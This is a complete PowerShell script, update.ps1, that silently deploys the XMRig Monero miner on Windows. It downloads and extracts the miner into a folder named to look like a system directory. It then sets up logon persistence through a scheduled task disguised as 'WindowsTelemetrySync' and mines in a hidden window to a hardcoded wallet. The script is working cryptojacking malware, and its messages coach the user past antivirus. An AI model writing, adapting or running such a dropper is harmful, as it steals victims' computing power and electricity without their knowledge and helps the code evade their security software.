# [update.ps1] - Cruelmonks Deployment with Error Checking
$workDir = "$env:APPDATA\SystemServices"
$minerUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
$zipPath = "$workDir\data.zip"
$exePath = "$workDir\xmrig-6.21.0\xmrig.exe"
$wallet = "473TeE9SqJGd59Y7gzTjgmT4VNo1KK3y2QzZppdGSGQbbwCDpTrRYUMhRNoXattjfQPwpjzi92zB2NrDiHgm9kuF7Wp63tF"

function Report-Error {
    param($msg)
    Write-Host "[-] ERROR: $msg" -ForegroundColor Red
    Write-Host "[!] Check your Antivirus or run as Administrator."
    Start-Sleep -Seconds 10
    exit
}

Write-Host "[+] Initializing Cruelmonks..." -ForegroundColor Cyan

# Check Directory
try { if (!(Test-Path $workDir)) { New-Item -ItemType Directory -Path $workDir -Force | Out-Null } } 
catch { Report-Error "Access Denied creating directory." }

# Download & Extract
if (!(Test-Path $exePath)) {
    try {
        Write-Host "[+] Downloading..."
        Invoke-WebRequest -Uri $minerUrl -OutFile $zipPath -ErrorAction Stop
        Write-Host "[+] Extracting..."
        Expand-Archive -Path $zipPath -DestinationPath $workDir -Force -ErrorAction Stop
        Remove-Item $zipPath
    } catch {
        Report-Error "Defender or Antivirus blocked the download/extraction."
    }
}

# Launch & Persistence
try {
    $args = "-o pool.supportxmr.com:443 -u $wallet -p CruelWorker --donate-level 1 --background"
    Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute $exePath -Argument $args) -Trigger (New-ScheduledTaskTrigger -AtLogOn) -TaskName "WindowsTelemetrySync" -Force -ErrorAction SilentlyContinue
    Start-Process -FilePath $exePath -ArgumentList $args -WindowStyle Hidden
    Write-Host "[+] SUCCESS: Mining started in background." -ForegroundColor Green
} catch {
    Report-Error "Failed to start. File might be quarantined."
}
Start-Sleep -Seconds 5
